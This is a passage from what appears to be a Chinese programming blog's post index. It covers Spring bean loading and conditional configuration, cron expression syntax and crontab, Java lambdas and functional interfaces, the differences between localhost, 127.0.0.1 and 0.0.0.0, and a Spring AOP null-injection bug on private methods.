加载到容器之前的批处理操作。从名字可以看出是工厂模式\npublic class BookFactoryBean implements FactoryBean&lt;Book&gt; &#123;    @Override    public Book getObject() throws Exception &#123;        Book book = new Book();        // 各种相关的初始化操作        // ...        return book;    &#125;    // 获取 bean 的类型    @Override    public Class&lt;?&gt; getObjectType() &#123;        return Book.class;    &#125;    // 是否为单例模式（默认都为单例）    /*     多例模式即 每次向 spring 容器获取这个 bean 时，都会初始化(new)一个新的返回。    此时 spring 容器只管创建不管销毁。而单例模式，spring 掌握 bean 的整个生命周期     */    @Override    public boolean isSingleton() &#123;        return FactoryBean.super.isSingleton();    &#125;&#125;\n\n有了上面的实现 factorybean 接口之后的工厂类，再使用 @Bean 进行加载时。会调用 工厂类 的 getObject() 方法创建 bean\n@Configurationpublic class SpringConfig &#123;    @Bean    public BookFactoryBean book() &#123;        BookFactoryBean bookFactoryBean = new BookFactoryBean();        // 配置需要的参数等..        // ...        return bookFactoryBean;    &#125;&#125;\n\n拓展2：proxyBeanMethod 属性proxyBeanMethod 是 @Configuration 注解中的属性。默认值为 true这个属性决定了该配置类是否被代理。（spring 使用基于继承的 cglib 动态代理 和 基于接口的 jdk 动态代理 两种代理方式）\n为 true 时，配置类会被 cglib 代理增强。生成代理对象，放入 spring 容器。此时，bean 是单例的。@Bean 调用生成实例时，如果容器中已经存在这个 bean，就会直接返回。被称为 Full 模式\n为 false 时，每次获取 bean 都会生成新的 bean 对象。（多例被称为 Lite 模式\n@Import 加载 bean使用 @Import 注解导入需要注入的 bean 对应的字节码@Import 加载的 bean 名称为 全路径类名。比如 com.example.demo.Book导入 配置类，配置类及类里声明的 bean 都会被加载\n@Import(Book.class)public class SpringConfig&#123;&#125;\n\n被导入的 bean 无需注解声明\npublic class Book&#123;&#125;\n\n无侵入式编程降低了代码与 spring 的耦合。使用较多\n在上下文对象在容器中初始化完毕后手动注入 beanpublic class Main &#123;    public static void main(String[] args) &#123;        AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(SpringConfig.class);        context.register(Book.class);        // 指定 bean 名称        context.registerBean(&quot;javaBook&quot;, Book.class);    &#125;&#125;\n\n@Import 导入 ImportSelector 接口，实现对导入源的编程式处理框架中会大量使用。\npublic class TestImportSelector implements ImportSelector &#123;    @Override    public String[] selectImports(AnnotationMetadata importingClassMetadata) &#123;        /*        方法参数 importingClassMetadata 为导入类的元数据        可以获取导入各种信息及状态，从而可以对 bean 的加载进行控制等操作         */        boolean b = importingClassMetadata.hasAnnotation(&quot;org.springframework.context.annotation.Configuration&quot;);        if (b)&#123;            return new String[]&#123;&quot;com.example.demo.Book&quot;&#125;;        &#125;        return new String[0];    &#125;&#125;\n\n@Import 导入 ImportBeanDefinitionRegistrar 接口，实现对导入源的编程式处理，及注册相对于 ImportSelector 的拓展，可以使用 BeanDefinitionRegistry 注册器控制 bean 的注册等。\npublic class TestRegister implements ImportBeanDefinitionRegistrar &#123;    @Override    public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) &#123;        // 和 ImportSelector 一样，可以获得元数据进行控制        // ...        // 通过 BeanDefinition 的注册器注册实名 bean        AbstractBeanDefinition beanDefinition = BeanDefinitionBuilder.rootBeanDefinition(Book.class).getBeanDefinition();        registry.registerBeanDefinition(&quot;javaBook&quot;,beanDefinition);    &#125;&#125;\n\n@Import 导入 BeanDefinitionRegistryPostProcessor 接口，后置处理在 bean 定义注册器结束之后，执行 实现方法。最后对容器中的 bean 进行干预。\npublic class TestPostProcessor implements BeanDefinitionRegistryPostProcessor &#123;    @Override    public void postProcessBeanDefinitionRegistry(BeanDefinitionRegistry beanDefinitionRegistry) throws BeansException &#123;        // 和 ImportBeanDefinitionRegistrar 使用一样，不过最后执行。（bean 定义注册器完成后        AbstractBeanDefinition beanDefinition = BeanDefinitionBuilder.rootBeanDefinition(Book.class).getBeanDefinition();        beanDefinitionRegistry.registerBeanDefinition(&quot;javaBook&quot;,beanDefinition);    &#125;    @Override    public void postProcessBeanFactory(ConfigurableListableBeanFactory configurableListableBeanFactory) throws BeansException &#123;    &#125;&#125;\n\nbean 的加载控制编程式 控制 bean 加载上面 bean 的加载方式中，最后四种都可以在代码中对 bean 的加载加以控制。（加一些条件其他的则不行，写了便加载进去。无法加以条件的控制\n注解式 控制 bean 加载@Conditional 注解是 spring 提供的。可以帮助我们实现 bean 的加载控制。但他需要我们传一个 Condition 类型的参数。Condition 是一个接口，需要我们自己实现 matches 方法，实现规则以控制 bean 的加载。\nspringboot 提供了很多 Condition 的实现，大多以 ConditionalOn 开头，也有叫 Profile 的（区分加载环境等）。使用 @ConditionalOn*** 注解为 bean 的加载设置条件。\n比如下面的用法：在有 com.example.demo.Java 这个类的情况下，才加载 Book 这个 bean。\n@Configurationpublic class SpringConfig &#123;    @Bean    @ConditionalOnClass(name = &quot;com.example.demo.Java&quot;)    public Book getBook()&#123;        return new Book();    &#125;&#125;\n\n类似的还有 @ConditionalOnMissingClass、@ConditionalOnWebApplication、@ConditionalOnBean 等等注解，以实现不同的条件控制。\nbean 依赖属性的配置实现约定大于配置的一种方式吧。当配置属性时，使用配置文件中的属性。否则，使用默认值（即约定\n实现方式：\n基础类：\n@Datapublic class Cat &#123;    private String name;    private Integer age;&#125;\n\n@Datapublic class Mouse &#123;    private String name;    private Integer age;&#125;\n\n配置文件加载类：使用 @ConfigurationProperties(prefix &#x3D; “cartoon”) 加载配置文件中 cartoon 开头的属性\n@Data@ConfigurationProperties(prefix = &quot;cartoon&quot;)public class CartoonProperties &#123;    private Cat cat;    private Mouse mouse;&#125;\n\n依赖配置文件中属性的 bean：使用 @EnableConfigurationProperties(CartoonProperties.class) 让配置文件加载类（使用了 @ConfigurationProperties 注解的类）生效并将其注入到容器中，交由容器进行管理。如果不使用这个注解，则需要使用 @Component 手动注入。\n@Component@Data@EnableConfigurationProperties(CartoonProperties.class)public class CartoonCatAndMouse &#123;    private Cat cat;    private Mouse mouse;    private CartoonProperties cartoonProperties;    // 使用构造器注入，其他注入方式也可以    public CartoonCatAndMouse(CartoonProperties cartoonProperties) &#123;        this.cartoonProperties = cartoonProperties;        // 在无参构造中，进行一些条件的判断。以实现配置的内容生效，不配置使用默认值的效果        cat = new Cat();        cat.setName(cartoonProperties.getCat() != null &amp;&amp; StringUtils.hasText(cartoonProperties.getCat().getName()) ? cartoonProperties.getCat().getName() : &quot;tom&quot;);        cat.setAge(cartoonProperties.getCat() != null &amp;&amp; cartoonProperties.getCat().getAge() != null ? cartoonProperties.getCat().getAge() : 5);        mouse = new Mouse();        mouse.setName(cartoonProperties.getMouse() != null &amp;&amp; StringUtils.hasText(cartoonProperties.getMouse().getName()) ? cartoonProperties.getMouse().getName() : &quot;jerry&quot;);        mouse.setAge(cartoonProperties.getMouse() != null &amp;&amp; cartoonProperties.getMouse().getAge() != null ? cartoonProperties.getMouse().getAge() : 3);    &#125;    public void play() &#123;        System.out.println(cat.getAge() + &quot;岁的&quot; + cat.getName() + &quot;和&quot; + mouse.getAge() + &quot;岁的&quot; + mouse.getName() + &quot;打起来了&quot;);    &#125;&#125;\n\n配置文件中的内容：\ncartoon:  cat:    name: 图多盖洛    age: 3  mouse:    name: 泰菲    age: 1\n\nEND原理学习任重道远\n","categories":["学习笔记"],"tags":["java","spring"]},{"title":"cron表达式","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/cron%E8%A1%A8%E8%BE%BE%E5%BC%8F/","content":"简介cron 表达式是一个用于设置计划任务的字符串，其由几个字段组成，每个字段代表任务在相应时间、日期或时间间隔执行的规则。cron 表达式最初是在 类Unix 操作系统中使用的，而现在它已经被广泛地应用于各种操作系统和编程语言中。\ncron 表达式是一个字符串，以 5 或 6 个空格隔开，分为 6 或 7 个域，每一个域代表一个含义。\ncron 有如下两种语法格式：\n\n秒 分 小时 日期 月份 星期 年\n秒 分 小时 日期 月份 星期\n\n每个域允许的值\n\n\n域\n允许的值\n允许的特殊字符\n\n\n\n秒\n0-59\n, - * &#x2F;\n\n\n分\n0-59\n, - * &#x2F;\n\n\n小时\n0-23\n, - * &#x2F;\n\n\n日期\n1-31\n, - * ? &#x2F; L W C\n\n\n月份\n1-12\n, - * &#x2F; JAN-DEC\n\n\n星期\n1-7\n, - * ? &#x2F; L C # SUN-SAT\n\n\n年份（可选）\n留空，1970-2099\n, - * &#x2F;\n\n\n\n星期中，1表示星期日，2表示星期一，以此类推。月份中省略部分 JAN,FEB,MAR,APR,MAY,JUNE,JULY,AUG,SEP,OCT,NOW,DEC星期中省略部分 SUN,MON,TUE,WED,THU,FRI,SAT年份可选\n\n特殊字符含义\n\n\n字符\n含义\n示例\n\n\n\n*\n表示匹配域的任意值\n在分这个域使用 *，即表示每分钟都会触发事件。\n\n\n？\n表示匹配域的任意值，但只能用在日期和星期两个域，因为这两个域会相互影响。\n要在每月的 20 号触发调度，不管每个月的 20 号是星期几，则只能使用如下写法：13 13 15 20 * ?。其中，因为日期域已经指定了 20 号，最后一位星期域只能用 ?，不能使用 *。如果最后一位使用 *，则表示不管星期几都会触发，与日期域的 20 号相斥，此时表达式不正确。\n\n\n-\n表示起止范围\n在分这个域使用 5-20，表示从 5 分到 20 分钟每分钟触发一次。\n\n\n&#x2F;\n表示起始时间开始触发，然后每隔固定时间触发一次\n在分这个域使用 5&#x2F;20，表示在第 5 分钟触发一次，之后每 20 分钟触发一次，即 5、 25、45 等分别触发一次。\n\n\n,\n表示列出枚举值\n在分这个域使用 5,20，则意味着在 5 和 20 分每分钟触发一次。\n\n\nL\n表示最后，只能出现在日和星期两个域\n在星期这个域使用 5L，意味着在最后的一个星期四触发。\n\n\nW\n表示有效工作日（周一到周五），只能出现在日这个域，系统将在离指定日期最近的有效工作日触发事件。\n在日这个域使用 5W，如果 5 号是星期六，则将在最近的工作日星期五，即 4 号触发。如果 5 号是星期天，则在 6 号（周一）触发；如果 5 号为工作日，则就在 5 号触发。另外，W 的最近寻找不会跨过月份。\n\n\nLW\n这两个字符可以连用，表示在某个月最后一个工作日，即最后一个星期五。\n\n\n\n#\n表示每个月第几个星期几，只能出现在星期这个域\n在星期这个域使用 4#2，表示某月的第二个星期三，4 表示星期三，2 表示第二个。\n\n\n\nC 字符没太明白，放在下面字符“C”允许在日期域和星期域出现。这个字符依靠一个指定的“日历”。也就是说这个表达式的值依赖于相关的“日历”的计算结果，如果没有“日历”关联，则等价于所有包含的“日历”。如：日期域是“5C”表示关联“日历”中第一天，或者这个月开始的第一天的后5天。星期域是“1C”表示关联“日历”中第一天，或者星期的第一天的后1天，也就是周日的后一天（周一）。不同环境的 cron 表达式实现不一致，部分字符可能只在特定环境生效。\n\ncrontab 用法Linux crontab 是用来定期执行程序的命令。crond 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。\n\n新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行。\n\n语法 crontab [ -u user ] file 或 crontab [ -u user ] &#123; -l | -r | -e &#125;\n说明 crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。\n参数\n\n-e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)\n-r : 删除目前的时程表\n-l : 列出目前的时程表\n\n示例（来自阿里文档）\n*&#x2F;5 * * * * ?    每隔 5 秒执行一次\n0 *&#x2F;1 * * * ?    每隔 1 分钟执行一次\n0 0 2 1 * ?    每月 1 日的凌晨 2 点执行一次\n0 15 10 ? * MON-FRI    周一到周五每天上午 10    15 执行作业\n0 15 10 ? 6L 2002-2006    2002 年至 2006 年的每个月的最后一个星期五上午 10:15 执行作业\n0 0 23 * * ?    每天 23 点执行一次\n0 0 1 * * ?    每天凌晨 1 点执行一次\n0 0 1 1 * ?    每月 1 日凌晨 1 点执行一次\n0 0 23 L * ?    每月最后一天 23 点执行一次\n0 0 1 ? * L    每周星期天凌晨 1 点执行一次\n0 26,29,33 * * * ?    在 26 分、29 分、33 分执行一次\n0 0 0,13,18,21 * * ?    每天的 0 点、13 点、18 点、21 点都执行一次\n0 0 10,14,16 * * ?    每天上午 10 点，下午 2 点，4 点执行一次\n0 0&#x2F;30 9-17 * * ?    朝九晚五工作时间内每半小时执行一次\n0 0 12 ? * WED    每个星期三中午 12 点执行一次\n0 0 12 * * ?    每天中午 12 点触发\n0 15 10 ? * *    每天上午 10:15 触发\n0 15 10 * * ?    每天上午 10:15 触发\n0 15 10 * * ? *    每天上午 10:15 触发\n0 15 10 * * ? 2005    2005 年的每天上午 10:15 触发\n0 * 14 * * ?    每天下午 2 点到 2:59 期间的每 1 分钟触发\n0 0&#x2F;5 14 * * ?    每天下午 2 点到 2:55 期间的每 5 分钟触发\n0 0&#x2F;5 14,18 * * ?    每天下午 2 点到 2:55 期间和下午 6 点到 6:55 期间的每 5 分钟触发\n0 0-5 14 * * ?    每天下午 2 点到 2:05 期间的每 1 分钟触发\n0 10,44 14 ? 3 WED    每年三月的星期三的下午 2:10 和 2:44 触发\n0 15 10 ? * MON-FRI    周一至周五的上午 10:15 触发\n0 15 10 15 * ?    每月 15 日上午 10:15 触发\n0 15 10 L * ?    每月最后一日的上午 10:15 触发\n0 15 10 ? * 6L    每月的最后一个星期五上午 10:15 触发\n0 15 10 ? * 6L 2002-2005    2002 年至 2005 年的每月的最后一个星期五上午 10:15 触发\n0 15 10 ? * 6#3    每月的第三个星期五上午 10:15 触发\n\n","categories":["学习笔记"],"tags":["定时任务","cron"]},{"title":"lambda表达式的使用","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%BD%BF%E7%94%A8/","content":"函数式编程在使用 lambda 之前，要先了解下函数式编程。函数式编程-wiki\n函数式编程，或称函数程序设计、泛函编程（英语：Functional programming），是一种编程范型，它将电脑运算视为函数运算，并且避免使用程序状态以及可变物件。它的特点就是，函数和其他变量一样，可以作为参数传递给其他函数，也可以作为其他函数的返回值。\n可以作为参数，意味着函数嵌套，数学里的高阶函数 f(g(x)) 这种。可以作为返回值，可以实现惰性计算。（在需要结果时才对其进行计算，避免不必要的运算，节约内存。\n简单写下吧，概念性的东西不是我所擅长的。重点就是 函数也可以作为变量\nlambda 表达式Lambda 是 JDK8 中一个语法糖。他可以对某些匿名内部类的写法进行简化。（但是不能完全替代匿名内部类的使用它是函数式编程思想的一个重要体现。让我们不用关注是什么对象。而是更关注我们对数据进行了什么操作。\n下面直接举例子，关于线程的创建\npublic class Main &#123;    public static void main(String[] args) &#123;        // 使用匿名内部类的方式        new Thread(new Runnable() &#123;            @Override            public void run() &#123;                System.out.println(Thread.currentThread().getName() + &quot; run&quot;);            &#125;        &#125;).start();        // 简化匿名内部类的方式        new Thread(() -&gt; &#123;            System.out.println(Thread.currentThread().getName() + &quot; run&quot;);        &#125;).start();                // lambda 表达式简化        new Thread(() -&gt; System.out.println(Thread.currentThread().getName() + &quot; run&quot;)).start();    &#125;&#125;\n\n使用 lambda 的情况：要求实现的接口是 函数式接口函数式接口可以被隐式转换为 lambda 表达式。那么什么是函数式接口？看看上面例子中 Runnable接口 的实现：\npackage java.lang;// 注释...@FunctionalInterfacepublic interface Runnable &#123;    // 注释...    public abstract void run();&#125;\n\n简单的：函数式接口(Functional Interface)就是一个有且仅有一个抽象方法，但是可以有多个非抽象方法的接口。\n具体的：函数式接口：\n\n有且仅有一个抽象方法。\n可以有 默认（default）方法，因为有默认实现，不是抽象的。\n接口默认继承java.lang.Object，所以如果接口显示声明覆盖了Object中方法，那么也不算抽象方法。\n@FunctionalInterface 不是必须的，如果一个接口符合”函数式接口”定义，那么加不加该注解都没有影响。加上该注解能够更好地让编译器进行检查。如果编写的不是函数式接口，但是加上了 @FunctionInterface，那么编译器会报错。\n\n所以 lambda 表达式主要是对这种函数式接口的简化。它的主要原则：可推导可省略\n因为知道传入参数的类型，所以 new 匿名内部类的步骤可以省略。因为这个接口只有一个抽象方法需要实现，所以方法名可以省略。只有一个方法，那么这个方法的参数类型和返回值类型也可以省略。\n最后简化的结果就是 (参数) -&gt; &#123;方法体&#125;都省这么多了，那就再省一点。当参数值有一个时，小括号也可以省略；当方法体只有一条语句时，大括号也可以省略。就变成了 一个参数 -&gt; 语句\njdk 实现java.util.function 它包含了很多类，用来支持 Java的 函数式编程。\n主要的四个类是：Function&lt;T, R&gt; 接受一个参数，返回一个结果。Consumer 接受一个参数，执行一些操作，无返回值。Supplier 不接受参数，生成一个值，并返回一个值。Predicate 接受一个参数，返回一个布尔值。\n其余基本是这四个的拓展。Bi前缀为接收两个参数，以及指定特定类型。不像这四个使用的都是泛型。\n下面是它们接口的源码，很简单。\npackage java.util.function;import java.util.Objects;/** * Represents a function that accepts one argument and produces a result. */@FunctionalInterfacepublic interface Function&lt;T, R&gt; &#123;    /**     * Applies this function to the given argument.     */    R apply(T t);    /**     * Returns a composed function that first applies the &#123;@code before&#125;     * function to its input, and then applies this function to the result.     * If evaluation of either function throws an exception, it is relayed to     * the caller of the composed function.     */    default &lt;V&gt; Function&lt;V, R&gt; compose(Function&lt;? super V, ? extends T&gt; before) &#123;        Objects.requireNonNull(before);        return (V v) -&gt; apply(before.apply(v));    &#125;    /**     * Returns a composed function that first applies this function to     * its input, and then applies the &#123;@code after&#125; function to the result.     * If evaluation of either function throws an exception, it is relayed to     * the caller of the composed function.     */    default &lt;V&gt; Function&lt;T, V&gt; andThen(Function&lt;? super R, ? extends V&gt; after) &#123;        Objects.requireNonNull(after);        return (T t) -&gt; after.apply(apply(t));    &#125;    /**     * Returns a function that always returns its input argument.     */    static &lt;T&gt; Function&lt;T, T&gt; identity() &#123;        return t -&gt; t;    &#125;&#125;\n\npackage java.util.function;import java.util.Objects;/** * Represents an operation that accepts a single input argument and returns no * result. Unlike most other functional interfaces, &#123;@code Consumer&#125; is expected * to operate via side-effects. */@FunctionalInterfacepublic interface Consumer&lt;T&gt; &#123;    /**     * Performs this operation on the given argument.     */    void accept(T t);    /**     * Returns a composed &#123;@code Consumer&#125; that performs, in sequence, this     * operation followed by the &#123;@code after&#125; operation. If performing either     * operation throws an exception, it is relayed to the caller of the     * composed operation.  If performing this operation throws an exception,     * the &#123;@code after&#125; operation will not be performed.     */    default Consumer&lt;T&gt; andThen(Consumer&lt;? super T&gt; after) &#123;        Objects.requireNonNull(after);        return (T t) -&gt; &#123; accept(t); after.accept(t); &#125;;    &#125;&#125;\n\npackage java.util.function;/** * Represents a supplier of results. */@FunctionalInterfacepublic interface Supplier&lt;T&gt; &#123;    /**     * Gets a result.     */    T get();&#125;\n\npackage java.util.function;import java.util.Objects;/** * Represents a predicate (boolean-valued function) of one argument. */@FunctionalInterfacepublic interface Predicate&lt;T&gt; &#123;    /**     * Evaluates this predicate on the given argument.     */    boolean test(T t);    /**     * Returns a composed predicate that represents a short-circuiting logical     * AND of this predicate and another.  When evaluating the composed     * predicate, if this predicate is &#123;@code false&#125;, then the &#123;@code other&#125;     * predicate is not evaluated.     */    default Predicate&lt;T&gt; and(Predicate&lt;? super T&gt; other) &#123;        Objects.requireNonNull(other);        return (t) -&gt; test(t) &amp;&amp; other.test(t);    &#125;    /**     * Returns a predicate that represents the logical negation of this     * predicate.     */    default Predicate&lt;T&gt; negate() &#123;        return (t) -&gt; !test(t);    &#125;    /**     * Returns a composed predicate that represents a short-circuiting logical     * OR of this predicate and another.  When evaluating the composed     * predicate, if this predicate is &#123;@code true&#125;, then the &#123;@code other&#125;     * predicate is not evaluated.     */    default Predicate&lt;T&gt; or(Predicate&lt;? super T&gt; other) &#123;        Objects.requireNonNull(other);        return (t) -&gt; test(t) || other.test(t);    &#125;    /**     * Returns a predicate that tests if two arguments are equal according     * to &#123;@link Objects#equals(Object, Object)&#125;.     */    static &lt;T&gt; Predicate&lt;T&gt; isEqual(Object targetRef) &#123;        return (null == targetRef)                ? Objects::isNull                : object -&gt; targetRef.equals(object);    &#125;&#125;\n\n关于它们默认方法的使用，这里也举一个小例子来说明。关于 FUnction&lt;T, R&gt; 默认方法 compose 和 andThen 的使用：\npublic class Main &#123;    public static void main(String[] args) &#123;        // 使用 lambda 定义 Function 的实现        Function&lt;String, String&gt; f1 = s -&gt; s.toUpperCase();        Function&lt;String, String&gt; f2 = s -&gt; s + &quot; world&quot;;        // f1 执行之前 执行 f2         // HELLO WORLD        String res1 = f1.compose(f2).apply(&quot;hello&quot;);        // f1 执行之后 执行 f2          // HELLO world        String res2 = f1.andThen(f2).apply(&quot;hello&quot;);        System.out.println(res1);        System.out.println(res2);    &#125;&#125;\n\n由于这些默认函数的返回值是接口本身，所以可以很愉快的进行链式调用。\n关于 stream 流 以及总结得益于 Lambda 的引入，让 Java 8 中的流式操作成为可能，Java 8 提供了 stream 类用于获取数据流，它专注对数据集合进行各种高效便利操作，提高了编程效率，且同时支持串行和并行的两种模式汇聚计算。能充分的利用多核优势。\n流式操作很爽，流式操作一切从这里开始。\n// 为集合创建串行流stream()// 为集合创建并行流parallelStream()\n\nstream 流应该是重点，且看下回。lambda 主要是将函数作为参数和返回值。将计算的过程抽象为一个函数，可以将这个函数作用于其他的数据，也可以让其他函数返回一个函数。这里写的比较抽象，还是在自己写的时候更容易理解，多写吧。\n这篇个人感觉写的不是很好，有些乱了。因为从 Optional 看到 lambda 再到 stream，想去翻翻源码，然后越看越乱。发现 stream 流创建时，还分为并行流和串行流。和多线程有关的没一个简单的啊决定先整理一点，缓一缓。\n其他参考函数式编程-入门篇章函数式编程之惰性求值函数式编程的核心思想Java高级特性—-函数式编程的使用Java 8 函数式接口\nLambda表达式和匿名内部类的区别Java 8 Lambda 表达式介绍Java Lambda 表达式Java8新特性 Lambda底层实现原理Java8系列 (一) Lambda表达式快速看清lambda的本质\n","categories":["学习笔记"],"tags":["java","lambda","函数式编程"]},{"title":"localhost、127.0.0.1和0.0.0.0的区别","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/localhost%E3%80%81127-0-0-1%E5%92%8C0-0-0-0%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"产生的问题及原因编写 socket 发送端和接收端程序。本地测试功能正常，但部署到云服务器测试时出现问题。报错为 连接被拒绝\n这个问题的答案早在 2022年的7月30日 就遇到，并且找到的解决方案。但是在半年多之后的4月5日，又碰到这个问题并且耗费了很多时间。所以在此较为详细的记录一下。\n回到上面的问题，解决的方案是：将接收端程序监听的 host 从 127.0.0.1 或者 localhost 改为 0.0.0.0 或者 指定网卡的 ip下面开始是这三个的详细区别\n127.0.0.1所有以 127 开头的 IP 地址，都是回环地址（loop back address）其所在的回环接口一般被理解为虚拟网卡，并不是真正的路由器接口。\n回环地址，就是任何发送给以 127 开头的回环地址的数据包，都会被自己接受。就是发不出去。\n那么，为什么上面接收端程序监听回环地址不能收到外部发来的信息呢？因为 回环地址绑定在 loopback 接口上，只能本机访问。这也是为什么本地测试成功的原因（接收端与发送端部署在一台机器上）。\n\n正常的数据包会从IP层进入链路层，然后发送到网络上。而给回环地址发送数据包，数据包会直接被发送主机的IP层获取，后面就没有链路层的事了。\n\nlocalhostlocalhost 是个域名通常被默认指向 127.0.0.1 这个地址，以及支持 ipv6 的 [::1]\nlinux 中被定义在 &#x2F;etc&#x2F;hosts 文件中，是可以修改的。指向其他 ip 地址也是没有问题的，毕竟只是个域名。\n0.0.0.0ipv4 中，0.0.0.0 表示一个无效的、未知的、不可用的目标。被称为 Unspecified它表示本机中所有的 ipv4 地址，不指定监听哪个网卡时，可以使用 0.0.0.0 监听本机所有 ip 的端口。\n总结有区别，区别说大也大，说不大也还行。反正使用的时候要注意。\n另外就是关于查看网卡信息的命令 ifconfig查看网卡信息：ifconfig命令及详细介绍\n","categories":["编程记录"],"tags":["ip地址"]},{"title":"private 方法使用 AOP 导致注入属性为 null 的问题","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/private%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8AOP%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5%E5%B1%9E%E6%80%A7%E4%B8%BAnull%E7%9A%84%E9%97%AE%E9%A2%98/","content":"问题描述项目中使用 aop 实现多数据源切换，如下：\n自定义注解：\n@Target(&#123;ElementType.METHOD, ElementType.TYPE, ElementType.PARAMETER&#125;)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface DataSource &#123;    String value() default &quot;primary&quot;;&#125;\n\naop 方法：\n@Aspect@Configuration@Slf4jpublic class DataSourceAspect &#123;    @Before(&quot;@annotation(dataSource)&quot;)    public void switchDataSource(JoinPoint point, DataSource dataSource) &#123;        String value = dataSource.value();        // 切换数据源        DynamicDataSourceService.switchDb(value);    &#125;    @After(&quot;@annotation(dataSource)&quot;)    public void restDataSource(JoinPoint point, DataSource dataSource) &#123;        // 重置数据源        DynamicDataSourceService.resetDb();    &#125;&#125;\n\n使用：\n@RestController@RequiredArgsConstructor@RequestMapping(&quot;/test&quot;)public class TestController &#123;    private final TestService service;        @PostMapping(&quot;/select&quot;)    @DataSource(&quot;db2&quot;)    public Result&lt;List&lt;Object&gt;&gt; selectCity() &#123;        List&lt;Object&gt; res = service.selectAll();        return Result.success(res);    &#125;&#125;\n\n具体切换方法省略。\n问题代码：\n@RestController@RequiredArgsConstructor@RequestMapping(&quot;/test&quot;)public class TestController &#123;    private final TestService service;        @PostMapping(&quot;/select&quot;)    @DataSource(&quot;db2&quot;)    private Result&lt;List&lt;Object&gt;&gt; selectCity() &#123;        List&lt;Object&gt; res = service.selectAll();        return Result.success(res);    &#125;&#125;\n\n报错：java.lang.NullPointerException         at com.example.controller.TestController.select(TestController.java:48)\n问题分析先定义两个方法，一个 public 一个 private，比较区别。\n@RestController@RequiredArgsConstructor@RequestMapping(&quot;/test&quot;)public class TestController &#123;    private final TestService service;    @PostConstruct    public void init() &#123;        log.info(&quot;service bean:&quot; + service);    &#125;    @PostMapping(&quot;/selectPublic&quot;)    @DataSource(&quot;db2&quot;)    public Result&lt;List&lt;Object&gt;&gt; selectPublic() &#123;        List&lt;Object&gt; res = service.selectAll();        return Result.success(res);    &#125;    @PostMapping(&quot;/selectPrivate&quot;)    @DataSource(&quot;db2&quot;)    private Result&lt;List&lt;Object&gt;&gt; selectPrivate() &#123;        List&lt;Object&gt; res = service.selectAll();        return Result.success(res);    &#125;&#125;\n\n启动后，日志：2024-02-04 20:06:26,704 INFO [main] com.example.controller.TestController -&gt; service bean:com.example.service.impl.TestServiceImpl@710ae6a7\n说明 bean 是被正常注入进 spring 容器中的。调用 selectPublic 是可以正常返回的，注入也是正常。调用 selectPrivate 则会报错：java.lang.NullPointerException，service 没有成功注入。\n\n这里的 private 方法是被 AOP 拦截的。普通的 private 方法，如果没有 AOP，bean 的注入是正常的，不会出现 NPE 报错。\n\n在 org.springframework.web.method.support 中 InvocableHandlerMethod 类的 doInvoke 方法上打断点。可以发现，不管是 public 方法还是 private 方法， cglib 创建的代理类中，service 属性为 null。\n但是，当在 AOP 的拦截方法上打断点，可以发现，public 方法是可以停在断点上的，但 private 方法则直接结束，并没有执行 AOP 的方法。所以 private 方法是没有被 AOP 所拦截的。会继续使用代理类，而代理类中的 service 并没有注入，是 null 。从而导致 NPE 报错。\n那么，为什么 public 没有报错呢？想必 AOP 中做了些处理，注入了所需要的 bean。\norg.springframework.aop.framework 的 CglibAopProxy 类中有个内部类 CglibMethodInvocation 如下：\nprivate static class CglibMethodInvocation extends ReflectiveMethodInvocation &#123;    @Nullable    private final MethodProxy methodProxy;    public CglibMethodInvocation(Object proxy, @Nullable Object target, Method method, Object[] arguments, @Nullable Class&lt;?&gt; targetClass, List&lt;Object&gt; interceptorsAndDynamicMethodMatchers, MethodProxy methodProxy) &#123;        super(proxy, target, method, arguments, targetClass, interceptorsAndDynamicMethodMatchers);        this.methodProxy = Modifier.isPublic(method.getModifiers()) &amp;&amp; method.getDeclaringClass() != Object.class &amp;&amp; !AopUtils.isEqualsMethod(method) &amp;&amp; !AopUtils.isHashCodeMethod(method) &amp;&amp; !AopUtils.isToStringMethod(method) ? methodProxy : null;    &#125;    @Nullable    public Object proceed() throws Throwable &#123;        try &#123;            return super.proceed();        &#125; catch (RuntimeException var2) &#123;            throw var2;        &#125; catch (Exception var3) &#123;            if (!ReflectionUtils.declaresException(this.getMethod(), var3.getClass()) &amp;&amp; !KotlinDetector.isKotlinType(this.getMethod().getDeclaringClass())) &#123;                throw new UndeclaredThrowableException(var3);            &#125; else &#123;                throw var3;            &#125;        &#125;    &#125;    protected Object invokeJoinpoint() throws Throwable &#123;        return this.methodProxy != null ? this.methodProxy.invoke(this.target, this.arguments) : super.invokeJoinpoint();    &#125;&#125;\n\nbean 就是在这个代理类中进行注入的。public 方法执行 invoke(this.target, this.arguments)protected 方法执行 super.invokeJoinpoint()\nCglibAopProxy 下执行的时候，上面无论哪个方法都会用实际对象来进行反射调用。而实际对象的 bean 属性值在 spring 启动时便已经注入了。因此代理对象会被重新赋值，即：用实际对象来代替原有的代理对象。\n\nsuper.invokeJoinpoint() 方法主要调用了 method.setAccessible(true); 取消 Java 语言访问检查。\n\n总结private 方法并没有被真正的代理类拦截。虽然代理类 InvocableHandlerMethod 中 private 方法执行了 doInvoke，但是并没有被 CglibAopProxy 拦截。因此 private 方法无法获取被代理目标对象，也就无法获取注入的bean属性。\n解决方法\n把 private 方法改为 public 方法。（不要粗心写错了，指我自己）\n从 ApplicationContext 上下文中直接获取 bean。\n\n参考Java 在Controller层 